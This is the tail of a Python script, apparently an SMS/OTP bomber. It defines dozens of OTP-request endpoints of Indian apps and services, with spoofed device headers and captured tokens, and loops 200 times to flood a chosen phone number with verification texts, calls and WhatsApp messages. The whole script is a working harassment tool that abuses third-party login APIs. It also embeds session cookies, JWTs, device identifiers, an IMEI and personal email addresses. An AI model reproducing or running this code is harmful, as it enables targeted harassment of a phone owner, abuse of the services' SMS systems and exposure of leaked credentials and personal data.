        "method": "POST",
        "data": {"isPlaycircle": False, "mobile": number, "deviceId": "1aeb7fad-58d0-4887-9f77-2a469039a413", "deviceName": "", "refCode": ""}
    },
    {
        "url": "https://www.samsung.com/in/api/v1/sso/otp/init",
        "method": "POST",
        "data": {"user_id": number}
    },
    
    {
        "url": "https://omni-api.moreretail.in/api/v1/login/",
        "method": "POST",
        "data": {"phone_number": number, "hash_key": "XfsoCeXADQA"}
    },
    {
        "url": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "data": {"mobile": number}
    },
    {
        "url": "https://agnet.ninjacart.in/iam/api/v1/auth/send/otp",
        "method": "POST",
        "data": {"contactNumber": number, "retryCount": "null"}
    },
    
    {
            "url": "https://api.doubtnut.com/v4/student/login",
            "method": "POST",
            "data": {
                "app_version": "7.10.2",
                "aaid": "a4c4e462-2744-4c94-85ea-db8b47f75d00",
                "course": "",
                "phone_number": number,
                "language": "en",
                "udid": "0ae3a1bee1561e32",
                "class": "",
                "gcm_reg_id": "f38jugJKSEKBOkcASRbSiJ:APA91bElvA0mtSl4LIYxxH60qQJP_U8bU9ew16vhiiQRdSzVFpJOBtr9ooY4hbOd2NmALUDt5sERZsO0NLRob3zf2MoCoaqciF2XibBo22VPxYIFqDULptYTVrEcgZCQ_qpXAfYKD-iR"
            },
            "headers": {
                "Host": "api.doubtnut.com",
                "version_code": "1111",
                "has_upi": "true",
                "device_model": "Redmi Note 7 Pro",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            }
        },
        {
            "url": "https://micro.doubtnut.com/otp/send-call",
            "method": "PUT",
            "data": {
                "phone": number,
                "locale": "en"
            },
            "headers": {
                "Host": "micro.doubtnut.com",
                "version_code": "1111",
                "has_upi": "true",
                "device_model": "Redmi Note 7 Pro",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            }
        },
    {
        "url": "https://loginapi.gaadibazaar.in/v5/verification-code",
        "method": "POST",
        "data": {"mobile_number": number}
    },
    {
        "url": "https://asset-transaction-api.rupyy.com/send/otp-v2",
        "method": "POST",
        "data": {"referenceId": number, "mobile": "9336734442", "type": "otp", "value": "null", "product": "personalLoan", "retries": 1, "extraInfo": {}}
    },
    {
        "url": "https://mrbrownbakery.com/public/api/reactotp",
        "method": "POST",
        "data": {"mobile": number}
    },
    
    {
        "url": "https://apis.tradeindia.com/app_login_api/login_app",
        "method": "POST",
        "data": {"mobile": "+91"+number}
    },
    
    {
        "url": "https://api.healthmug.com/account/createotp",
        "method": "POST",
        "data": {"mobileno": number}
    },
    {
        "url": "https://cst.brevistay.com/app-api/login",
        "method": "POST",
        "data": {"is_otp": 1, "is_password": 0, "mobile": number, "otp": 123456, "password": ""}
    },
    {
        "url": "https://api.spinny.com/v3/api/user/status",
        "method": "POST",
        "data": {"contact_number": number}
    },
    {
        "url": "https://www.homecentre.in/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "data": {"signInMobile": "+91"+number}
    },
    {
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "data": {"retries": 0.0, "phone_number": "91"+number, "source": "employer", "hash_type": "employer"}
    },
    {
        "url": "https://clicktobuy.hyundai.co.in/ctb/bank/generateOtpForAuthentication.ctb",
        "method": "POST",
        "data": {"cstmMob": number}
    },
    {
        "url": "https://shop.havells.com/graphql",
        "method": "POST",
        "data": {"variables": {"mobile": number}, "query": "mutation sendOtp($mobile: String!) {\n  sendOtp(mobile: $mobile) {\n    mobile\n    message\n    __typename\n  }\n}\n", "operationName": "sendOtp"}
    },
    
    {
        "url": "https://gateway.credmudra.com/public/send-otp",
        "method": "POST",
        "data": {"data": {"contactNo": number, "resend": "false", "anonymousId": "65d48590cbf0720f6eec2505"}}
    },
    {
    "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
    "method": "POST",
    "data": {"mobile": number}
},

{
    "url": "https://drizzles.spectroapp.com/api/m/customer/auth/send/otp",
    "method": "POST",
    "data": {"phone": number, "device_id": "c7abc1fd7459e84c"}
},
{
    "url": "https://app.tabelawala.com/api/signin",
    "method": "POST",
    "data": {
        "phone_number": number,
        "refer_code": "",
        "device_token": "eDJCrcYWTsqsqFcpcQhieB:APA91bHGg9fwSu1yr_ECk6a-dVJxVff4-crl_Z9rmIJVHdxkTqc5vO3UmrejbSRCCKx1gJSgjvmy4R6OX40enDtIsQVxMqN3sO5b1W9xTalDxHsIWW-_taNYGgGf5ddSCTVZWV_uh_3f",
        "latitude": "27.31088606",
        "longitude": "79.53578356",
        "device_type": "android"
    }
},
{
    "url": "https://api.charzer.com/auth-service/send-otp",
    "method": "POST",
    "data": {"appSource": "CHARZER_APP", "mobileNumber": number}
},
{
    "url": "https://prod.efeed.in/api/customer/sendOtp",
    "method": "POST",
    "data": {"mobile": number}
},
{
    "url": "https://www.reboltnetwork.com/app/register",
    "method": "POST",
    "data": {"country_code": 91, "phone_number": number, "country_id": 104}
},

 {
            "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "method": "POST",
            "data": {
                "mobile": number
            },
            "headers": {
                "Host": "profile.swiggy.com",
                "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
                "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
                "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI9ZDYiLCJpZCI6IjI1MTM9ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
                "pl-version": "55",
                "user-agent": "Swiggy-Android",
                "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
                "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
                "version-code": "1161",
                "app-version": "4.38.1",
                "latitude": "0.0",
                "longitude": "0.0",
                "os-version": "13",
                "accessibility_enabled": "false",
                "swuid": "4c27ae3a76b146f3",
                "deviceid": "4c27ae3a76b146f3",
                "x-network-quality": "GOOD",
                "accept-encoding": "gzip",
                "accept": "application/json; charset=utf-8",
                "content-type": "application/json; charset=utf-8",
              #  "content-length": str(len(json.dumps(data5))),
                "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO"
            }
        },
        {
            "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
            "method": "POST",
            "data": {
                "device": "Android",
                "mobile_number": number,
                "mode": "IVR",
                "new_user": False
            },
            "headers": {
                "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJkLnR5IjoiTW9iaWxlIiwiZC5hYyI6IiIsImQuYXAiOiIiLCJkLnRyIjoiYTdmZWJjNzIyMzdiNDNmM2E1YjVmNTIxNjUxYzE0Y2QiLCJkLmlkIjoiMzM1M2I5Yjg1NDJmNDUzNyIsImQudGkiOjE2OTMyMDE5MTUwODF9fQ==",
                "traceparent": "00-a7febc72237b43f3a5b5f521651c14cd-3353b9b8542f4537-00",
                "tracestate": "@nr=0-2---3353b9b8542f4537----1693201915080",
                "x-source": "Android",
                "x-language": "en",
                "x-os": "11",
                "x-app-version-name": "8.4.3",
                "x-app-version-code": "343",
                "x-version-code": "343",
                "x-chatbot-version": "24",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.10.0"
            }
        },
        {
            "method": "POST",
            "url": "https://thanos.faasos.io/v3/customer/generate_otp.json?client_os=behrouz_android&app_version=10260&device_id=c7abc1fd7459e84c",
            "headers": {
                "Host": "thanos.faasos.io",
                "client-source": "13",
                "brand-id": "8",
                "app-version": "10260",
                "client-os": "behrouz_android",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.10.0"
            },
            "data": {
                "phone_number": number,
                "country_code": "IND",
                "dialing_code": "+91",
                "is_new_customer": True,
                "communication_channel": "whatsapp"
            }
        },
        {
            "method": "POST",
            "url": "https://api.carselonadaily.com/api/customer/v2/login",
            "headers": {
                "user-agent": "Dart/3.3 (dart:io)",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "authorization": "auth",
                "host": "api.carselonadaily.com"
            },
            "data": {
                "phone": number,
                "otpType": 0
            }
        },
        
        {
            "method": "POST",
            "url": "https://mybillbook.in/api/request_otp",
            "headers": {
                "Host": "mybillbook.in",
                "authorization": "Bearer",
                "device-id": "c7abc1fd7459e84c",
                "client": "android",
                "accept": "application/json",
                "company-id": "",
                "language": "english",
                "client-version": "299",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0"
            },
            "data": {
                "mobile_number": number,
                "otp_channel": "whatsapp"
            }
        },
        
        {
            "url": "https://api.hav-g.in/v2/auth/challenge",
            "method": "POST",
            "headers": {
                "Host": "api.hav-g.in",
                "accept": "application/json, text/plain, */*",
                "source": "APP",
                "content-type": "application/json",
                "content-length": "25",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {
                "phone": "+91"+number
            }
        },
        {
            "url": "https://api.hav-g.in/v2/auth/challenge?resend=true",
            "method": "POST",
            "headers": {
                "Host": "api.hav-g.in",
                "accept": "application/json, text/plain, */*",
                "source": "APP",
                "content-type": "application/json",
                "content-length": "25",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {
                "phone":"+91"+ number
            }
        },
        {
            "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "headers": {
                "Host": "api-gateway.juno.lenskart.com",
                "x-country-code-override": "IN",
                "accept-language": "en",
                "x-session-token": "ba761dad-180a-4dd5-b193-ef1c2e1bd142",
                "appversion": "4.2.6 (240405001)",
                "accept-encoding": "gzip",
                "x-build-version": "240405001",
                "api_key": "valyoo123",
                "x-accept-language": "en",
                "x-api-client": "android",
                "model": "SM-F7110",
                "x-b3-traceid": "1714497016147",
                "udid": "c7abc1fd7459e84c",
                "x-country-code": "IN",
                "brand": "samsung",
                "uniqueid": "18f2ffc5153c7abc",
                "content-type": "application/json",
                "x-app-version": "4.2.6 (240405001)",
                "user-agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)"
            },
            "data": {
                "phoneCode": "+91",
                "telephone": number
            }
        },
        
        {
            "url": "https://api.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Host": "api.foxy.in",
                "accept": "application/json",
                "x-build-version": "10.6.5",
                "x-app-platform": "android",
                "x-guest-token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "guest_token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "user": {
                    "phone_number": f"+91{number}"
                },
                "invite_code": ""
            }
        },
        {
            "url": "https://api.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Host": "api.foxy.in",
                "accept": "application/json",
                "x-build-version": "10.6.5",
                "x-app-platform": "android",
                "x-guest-token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "user": {
                    "phone_number": f"+91{number}"
                },
                "via": "whatsapp"
            }
        },
        {
            "method": "POST",
            "url": "https://tradws.stocknote.com/samco-webservice/AOF/LoginMobileOtp/1.0.0",
            "headers": {
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "tradws.stocknote.com",
                "Connection": "Keep-Alive",
                "Content-Length": "258"
            },
            "data": {
                "request": {
                    "appID": "9218fd7787cf85cc9f58a7c3482a93bc",
                    "formFactor": "M",
                    "requestType": "U",
                    "response_format": "json",
                    "data": {
                        "mobile": number,
                        "remote_add": "0.0.0.0",
                        "user_agent": "StockNote -42041,Android,Google,Android 14,CFNetwork 808.3,Darwin 16.3.0"
                    }
                }
            }
        },
        
        {
            "method": "POST",
            "url": "https://web-backend.biryanibykilo.com/backend-app/authentication/api/v2/send_otp",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI1ZDgzMzc5MS02ZjQ4LTRkYWQtYjNiYi0xY2ZiYjFjZDFjZmMiLCJpc19ndWVzdCI6dHJ1ZSwidHMiOiIyMDI0LTA1LTAzIDA0OjM0OjU4Iiwic291cmNlIjoiYXBwIiwicmVmcmVzaF90cyI6IjIwMjQtMDUtMTMgMDQ6MzQ6NTgifQ.WCluN6-GDSQbK4C7cifxTALUf2gEqe03AuJMld4lDuE",
                "platform": "android",
                "appversion": "19.0.0",
                "x-access-token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI1ZDgzMzc5MS02ZjQ4LTRkYWQtYjNiYi0xY2ZiYjFjZDFjZmMiLCJ0cyI6IjIwMjQtMDUtMDMgMDQ6MzQ6NTgiLCJzb3VyY2UiOiJhcHAiLCJpc19ndWVzdCI6dHJ1ZX0.j73Jqp-gK34D_b86B8izUqapfe7FAnuM7_xkPf3BNJ8",
                "client-id": "bbk",
                "Content-Type": "application/json",
                "Content-Length": "329",
                "Host": "web-backend.biryanibykilo.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.10.0"
            },
            "data": {
                "mobile": number,
                "device_type": "app",
                "is_signup": False,
                "login_id": "",
                "firebase_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI1ZDgzMzc5MS02ZjQ4LTRkYWQtYjNiYi0xY2ZiYjFjZDFjZmMiLCJ0cyI6IjIwMjQtMDUtMDMgMDQ6MzQ6NTgiLCJzb3VyY2UiOiJhcHAiLCJpc19ndWVzdCI6dHJ1ZX0.j73Jqp-gK34D_b86B8izUqapfe7FAnuM7_xkPf3BNJ8",
                "retry": False
            }
        },
        
        {
            "method": "POST",
            "url": "https://xylem-api.penpencil.co/v1/users/resend-otp?smsType=1",
            "headers": {
                "authorization": "Bearer",
                "client-id": "64254d66be2a390018e6d348",
                "client-version": "50028",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "randomid": "c7abc1fd7459e84c",
                "client-type": "MOBILE",
                "device-meta": '{"APP_VERSION":"50028","APP_VERSION_NAME":"23.6.5","DEVICE_MAKE":"Samsung","DEVICE_MODEL":"SM-F7110","OS_VERSION":"14","PACKAGE_NAME":"com.owebso.svs.xylemlern","network":"mobile_data","carrier":"UNDEFINED"}',
                "referer": "https://android.pw.live",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip"
            },
            "data": {
                "mobile": number,
                "organizationId": "64254d66be2a390018e6d348"
            }
        },
        {
            "method": "POST",
            "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
            "headers": {
                "authorization": "Bearer",
                "client-id": "64254d66be2a390018e6d348",
                "client-version": "50028",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "randomid": "c7abc1fd7459e84c",
                "client-type": "MOBILE",
                "device-meta": '{"APP_VERSION":"50028","APP_VERSION_NAME":"23.6.5","DEVICE_MAKE":"Samsung","DEVICE_MODEL":"SM-F7110","OS_VERSION":"14","PACKAGE_NAME":"com.owebso.svs.xylemlern","network":"mobile_data","carrier":"UNDEFINED"}',
                "referer": "https://android.pw.live",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip"
            },
            "data": {
                "firstName": "shiva",
                "lastName": "",
                "mobile": number,
                "countryCode": "+91"
            }
        },
        {
            "method": "POST",
            "url": "https://api.hogr.app/api/apigateway?api=generateotp",
            "headers": {
                "user-agent": "Dart/3.3 (dart:io)",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "host": "api.hogr.app",
                "Content-Length": "225"
            },
            "data": {
                "phone": f"+91{number}",
                "can_whatsapp_messages": True,
                "pk": "f6mx-A0_SGK_UxnbwVi2kN:APA91bEgFLmpvykAXsU0owL35Uzjogpl6WLxU53GY2X0VLxuA-FQ5W5lO7dmRUaX2tnwTRFELrGPuDfMGsqFLoqUNeyzaQKi7ka2GiXxQ-yytVRe6vEq0yyQdb-3uPBRF_0NjzGfl0B6"
            }
        },
        
        {
            "url": "https://api.rummyculture.com/api/auth/generateOtp",
            "method": "POST",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {"mobile": number, "verificationChannel": "5", "medium": "SMS"}
        },
        {
            "url": "https://api.rummyculture.com/api/auth/generateOtp",
            "method": "POST",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {"mobile": number, "verificationChannel": "5", "medium": "WHATSAPP"}
        },
        {
            "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
            "method": "POST",
            "headers": {
                "User-Agent": "Udaan-Android-App/70350 7.35/4744 (14;Android) (samsung;lahaina;;SM-F7110;)",
                "Content-Type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "origin": "https://auth.udaan.com",
                "x-requested-with": "com.udaan.android"
            },
            "data": {"mobile": number}
        },
        {
            "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&isResend=true",
            "method": "POST",
            "headers": {
                "User-Agent": "Udaan-Android-App/70350 7.35/4744 (14;Android) (samsung;lahaina;;SM-F7110;)",
                "Content-Type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "origin": "https://auth.udaan.com",
                "x-requested-with": "com.udaan.android"
            },
            "data": {"mobile": number}
        },
        
        {
      "url": "https://py.api.localwell.in/authenticate/send_login_otp",
      "method": "POST",
      "data": {
        "app_version_code": 80,
        "mobile_number": number,
        "is_whatsapp_opted": "true",
        "device_type": "mobile"
      }
    },
    {
      "url": "https://docon.co.in/api/v1/user/online-login",
      "method": "POST",
      "data": {
        "mobileNumber": number
      }
    },
    
    {
      "url": "https://api.pagarbook.com/api/v5/auth/otp/request",
      "method": "POST",
      "data": {
        "language": 1,
        "phone": number
      }
    },
    {
      "url": "https://app.getswipe.in/api/user/mobile_login",
      "method": "POST",
      "data": {
        "mobile": number,
        "resend": 0
      }
    },
    {
      "url": "https://v1.pro.rechargecube.in/auth/login/otp",
      "method": "POST",
      "data": {
        "mobile": number
      }
    },
    {
      "url": "https://nfapi.naturefit.in/api/auth/localsignup",
      "method": "POST",
      "data": {
        "mobile": number,
        "email": "null",
        "otp": "null",
        "doctor_reference_code": "null"
      }
    },
    
    {
      "url": "https://www.apnidukandari.com/api/register",
      "method": "POST",
      "data": {
        "first_name": "YTRAVAN",
        "email": "shivamrajput6006@gmail.com",
        "uuid": "100391226984769639023",
        "avatar": "null",
        "phone_number": number,
        "privacy": "true",
        "token": "06162cc11cd8cf0958ebbc62fadc4a48"
      }
    },
    {
      "url": "https://user.vedantu.com/user/preLoginVerification",
      "method": "POST",
      "data": {
        "phoneCode": "+91",
        "phoneNumber": number,
        "requestSource": "ANDROID",
        "appVersionCode": "2.4.0"
      }
    },
    {
      "url": "https://mudrex.com/api/auth-services/v1/accounts/phone/otp",
      "method": "POST",
      "data": {
        "category": "user",
        "organization": {
          "domain": "mudrex.com"
        },
        "config": {
          "phone": "+91"+number
        }
      }
    },
    
    
        {
            "method": "POST",
            "url": "https://cityfurnish.com/v1/user/sendotp_new",
            "headers": {
                "Host": "cityfurnish.com",
                "content-type": "multipart/form-data; boundary=a4ea9dcc-f610-4b15-ab52-0ecdd4168863",
                "content-length": "170",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.12.1"
            },
            "data": {
                "mobile_number": number
            }
        },
        {
            "method": "POST",
            "url": "https://mytvsapp-connect.tvs.in/api/v1/authenticate/sms/sendotp",
            "headers": {
                "Host": "mytvsapp-connect.tvs.in",
                "accept": "application/json, text/plain, */*",
                "client_code": "MvxW3k482v2o",
                "rememberme": "true",
                "countryname": "All",
                "timezone": "Asia/Calcutta",
                "token": "f7sgevhvT_moWhtaaygdtw:APA91bG3Ni804JJU1GDhQNGwj_mRcm6VWgsC05ss-kTWgp5J05itoeSXxTjDqAqk3DXe8Oh9nUxqjNVtvDka6eq912dLb3CKSiyDiy6orK3k5lPc5vswqbGixfdSCxWXsbkkmwLz3rRX",
                "content-type": "application/json",
                "content-length": "42",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {
                "mobile": "91" + number,
                "is_login": False
            }
        },
        {
            "method": "POST",
            "url": "https://www.apnidukandari.com/api/register",
            "headers": {
                "User-Agent": "okhttp/3.12.1",
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json"
            },
            "data": {
                "first_name": "YTRAVAN",
                "email": "shivamrajput662006@gmail.com",
                "uuid": "100391226984769639023",
                "avatar": None,
                "phone_number": number,
                "privacy": True,
                "token": "06162cc11cd8cf0958ebbc62fadc4a48"
            }
        },
        {
            "method": "POST",
            "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
            "headers": {
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json",
                "lang": "ENG",
                "AppIdKey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHAiOjAsImZmIjoiTSIsImJkIjoiYW5kcm9pZC1waG9uZSIsIm5iZiI6MTcxNTUzNzk4MCwic3JjIjoiZW10bXciLCJhdiI6IjQuNS4xNC4yIiwiYXBwaWQiOiI5MGM1ZWI3ZmI1ZThlZmNlMzZjOGNjMDllZWQwNzU4MiIsImlzcyI6ImVtdCIsImV4cCI6MTcxNTUzODYwMCwiaWF0IjoxNzE1NTM4MjgwfQ.wqCB5eHG7QiCr02U4qdD49hNhKVOmYLgQYUJNLe0VC8"
            },
            "data": {
                "screen": "1260 X 2624",
                "emailID": "shivamyou6000@gmail.com",
                "gps": "true",
                "imsi": "",
                "mobileNo": number,
                "firstName": "Shiva Riy",
                "osVersion": "14",
                "build": "android-phone",
                "countryCode": "91",
                "vendor": "samsung",
                "imei": "181105746837606",
                "model": "SM-F7110",
                "req": "generate"
            }
        },
        {
            "method": "POST",
            "url": "https://foodro.in/mobile/api/sent_otp.php",
            "headers": {
                "Host": "foodro.in",
                "Content-Length": "125",
                "sec-ch-ua": '"Chromium";v="124", "Android WebView";v="124", "Not-A.Brand";v="99"',
                "accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                "sec-ch-ua-mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "Origin": "https://foodro.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "Referer": "https://foodro.in/mobile/login.php?ref=my_account",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "cookie": "PHPSESSID=8uh6s67trl71jkpehvir2c38k1; city=Kochi; f_id=01a1556c78c561b6d6c63c40bc1678a2597efc950c2271a7014a256312774aa8e192daadaefd63400121d33d94472f992420a02a7c0c6d194550faa8609cedfa; user_s=0; _ga_B51XBWFGP2=GS1.1.1714911245.1.0.1714911245.60.0.942229316; _ga_SF8QHH846L=GS1.1.1714911245.1.0.1714911245.60.0.0; _ga=GA1.2.877931294.1714911245; _gid=GA1.2.1528247045.1714911246; _gat_gtag_UA_121037465_1=1",
                "priority": "u=1, i"
            },
            "data": {
                "number": number,
                "s_id": "5d11352d37c17e5242136069a5661e6aaa58fb23923ef9ced3c6aef6dd70ad66",
                "e_id": "524132b822571e303a6b87da9cd66169"
            }
        },
        
        {
            "method": "POST",
            "url": "https://indpe.co.in/user_apis/api.php",
            "headers": {
                "Content-Length": "95",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "indpe.co.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            },
            "data": {
                "type": "sendOTP",
                "number": number,
                "hash": "296cace78970b1fafafbc596f04b204c",
                "ip": "---",
                "city": "---",
                "region": "---"
            }
        },
        {
            "method": "POST",
            "url": "https://tileswale.com/api/v45/user_otp_send",
            "headers": {
                "Host": "tileswale.com",
                "User-Agent": "android",
                "twappversion": "2.1.3",
                "twapiversion": "v45",
                "twdevicemanufacturer": "samsung",
                "twdeviceosversion": "34",
                "twplatform": "1",
                "twdevicewidth": "1260",
                "twdeviceheight": "2624",
                "twtoken": "",
                "twlanguage": "",
                "twjwttoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqd3RUb2tlbiI6IlRpbGVzIFdhbGUiLCJqd3RTZWNyZXRLZXkiOiJ0d0BkZXZlbG9wZXJzQDkwMzM5MDk5In0.tbgYE2h0ZJ7o9I1bNGtNc1wj28mRxFJmh76u7nIXPf0",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "17",
                "Accept-Encoding": "gzip"
            },
            "data": {
                "mobile": number
            }
        },
        
        {
            "method": "POST",
            "url": "https://tileswale.com/api/v45/user_otp_send",
            "headers": {
                "Host": "tileswale.com",
                "User-Agent": "android",
                "twappversion": "2.1.3",
                "twapiversion": "v45",
                "twdevicemanufacturer": "samsung",
                "twdeviceosversion": "34",
                "twplatform": "1",
                "twdevicewidth": "1260",
                "twdeviceheight": "2624",
                "twtoken": "",
                "twlanguage": "",
                "twjwttoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqd3RUb2tlbiI6IlRpbGVzIFdhbGUiLCJqd3RTZWNyZXRLZXkiOiJ0d0BkZXZlbG9wZXJzQDkwMzM5MDk5In0.tbgYE2h0ZJ7o9I1bNGtNc1wj28mRxFJmh76u7nIXPf0",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "17",
                "Accept-Encoding": "gzip"
            },
            "data": {
                "mobile": number
            }
        },
        




    ]
    
    # Run the requests for 20 times
    for _ in range(200):
        for api in apis:
            if api["method"] == "GET":
                response = requests.get(api["url"], params=api.get("params", {}), headers=api.get("headers", {}))
            elif api["method"] == "POST":
                response = requests.post(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            elif api["method"] == "PUT":
                response = requests.put(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
          #  print(f"Request to {api['url']} - Status Code: {response.status_code}")
        # Add a delay of 1 second between requests
      #  time.sleep(1)

# Example usage:
#smsgii("9332")  # Replace "942" with the phone number you want to use
